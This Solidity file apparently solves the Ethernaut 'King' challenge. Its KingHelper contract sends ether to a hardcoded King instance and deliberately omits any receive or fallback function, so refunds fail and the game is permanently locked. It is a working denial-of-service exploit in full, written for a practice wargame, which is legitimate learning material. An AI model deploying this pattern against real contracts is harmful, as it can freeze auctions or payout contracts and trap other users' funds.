// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./King.sol";

contract KingHelper {
  // Do not contain any fallback or receive function to make transfer ether to this contract failed
  King king = King(0x2B16b0407c9C46EaAE66F58F29b7868000aEC75f);

  function becomeKing() public payable {
      address(king).call.value(msg.value)("");
  }
}